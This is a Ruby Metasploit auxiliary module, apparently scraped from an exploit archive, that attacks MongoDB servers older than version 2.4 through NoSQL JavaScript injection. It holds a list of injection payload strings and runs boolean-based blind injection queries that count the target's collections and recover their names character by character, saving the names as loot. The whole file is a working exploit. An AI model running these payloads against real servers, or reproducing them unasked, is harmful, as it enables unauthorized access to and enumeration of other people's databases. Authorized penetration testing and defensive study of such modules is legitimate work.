## This module requires Metasploit: http//metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require &#039;msf/core&#039;

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039; => "MongoDB NoSQL Collection Enumeration Via Injection",
      &#039;Description&#039; => %q{
This module can exploit NoSQL injections on MongoDB versions less than 2.4
and enumerate the collections available in the data via boolean injections.
},
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039; =>
        [&#039;Brandon Perry <bperry.volatile[at]gmail.com>&#039;],
      &#039;References&#039; =>
        [
          [&#039;URL&#039;, &#039;http://nosql.mypopescu.com/post/14453905385/attacking-nosql-and-node-js-server-side-javascript&#039;]
        ],
      &#039;Platform&#039; => [&#039;linux&#039;, &#039;win&#039;],
      &#039;Privileged&#039; => false,
      &#039;DisclosureDate&#039; => "Jun 7 2014"))

      register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Full vulnerable URI with [NoSQLi] where the injection point is&#039;, &#039;/index.php?age=50[NoSQLi]&#039;])
      ], self.class)
  end

  def syntaxes
    [["\"&#039;||this||&#039;", "&#039;||[inject]||&#039;"],
     ["\"&#039;;return+true;var+foo=&#039;", "&#039;;return+[inject];var+foo=&#039;"],
     [&#039;\&#039;"||this||"&#039;,&#039;"||[inject]||"&#039;],
     [&#039;\&#039;";return+true;var+foo="&#039;, &#039;";return+[inject];var+foo="&#039;],
     ["||this","||[inject]"]]
  end

  def run
    uri = datastore[&#039;TARGETURI&#039;]

    res = send_request_cgi({
      &#039;uri&#039; => uri.sub(&#039;[NoSQLi]&#039;, &#039;&#039;)
    })

    if !res
      fail_with("Server did not respond in an expected way.")
    end

    pay = ""
    fals = res.body
    tru = nil

    syntaxes.each do |payload|
      print_status("Testing " + payload[0])
      res = send_request_cgi({
        &#039;uri&#039; => uri.sub(&#039;[NoSQLi]&#039;, payload[0])
      })

      if res and res.body != fals and res.code == 200
        print_status("Looks like " + payload[0] + " works")
        tru = res.body

        res = send_request_cgi({
          &#039;uri&#039; => uri.sub(&#039;[NoSQLi]&#039;, payload[0].sub(&#039;true&#039;, &#039;false&#039;).sub(&#039;this&#039;, &#039;!this&#039;))
        })

        if res and res.body != tru and res.code == 200
          vprint_status("I think I confirmed with a negative test.")
          fals = res.body
          pay = payload[1]
          break
        end
      end
    end

    if pay == &#039;&#039;
      fail_with("Couldn&#039;t detect a payload, maybe it isn&#039;t injectable.")
    end

    length = 0
    vprint_status("Getting length of the number of collections.")
    (0..100).each do |len|
      str = "db.getCollectionNames().length==#{len}"
      res = send_request_cgi({
        &#039;uri&#039; => uri.sub(&#039;[NoSQLi]&#039;, pay.sub(&#039;[inject]&#039;, str))
      })

      if res and res.body == tru
        length = len
        print_status("#{len} collections are available")
        break
      end
    end

    vprint_status("Getting collection names")

    names = []
    (0...length).each do |i|
      vprint_status("Getting length of name for collection " + i.to_s)

      name_len = 0
      (0..100).each do |k|
        str = "db.getCollectionNames()[#{i}].length==#{k}"
        res = send_request_cgi({
          &#039;uri&#039; => uri.sub(&#039;[NoSQLi]&#039;, pay.sub(&#039;[inject]&#039;, str))
        })

        if res and res.body == tru
          name_len = k
          print_status("Length of collection #{i}&#039;s name is #{k}")
          break
        end
      end

      vprint_status("Getting collection #{i}&#039;s name")

      name = &#039;&#039;
      (0...name_len).each do |k|
        [*(&#039;a&#039;..&#039;z&#039;),*(&#039;0&#039;..&#039;9&#039;),*(&#039;A&#039;..&#039;Z&#039;),&#039;.&#039;].each do |c|
          str = "db.getCollectionNames()[#{i}][#{k}]==&#039;#{c}&#039;"
          res = send_request_cgi({
            &#039;uri&#039; => uri.sub(&#039;[NoSQLi]&#039;, pay.sub(&#039;[inject]&#039;, str))
          })

          if res and res.body == tru
            name << c
            break
          end
        end
      end

      print_status("Collections #{i}&#039;s name is " + name)
      names << name
    end

    p = store_loot("mongo_injection.#{datastore[&#039;RHOST&#039;]}_collections",
                   "text/plain",
                   nil,
                   names.to_json,
                   "mongo_injection_#{datastore[&#039;RHOST&#039;]}.txt",
                   "#{datastore["RHOST"]} MongoDB Javascript Injection Collection Enumeration")

    print_good("Your collections are located at: " + p)
  end
end

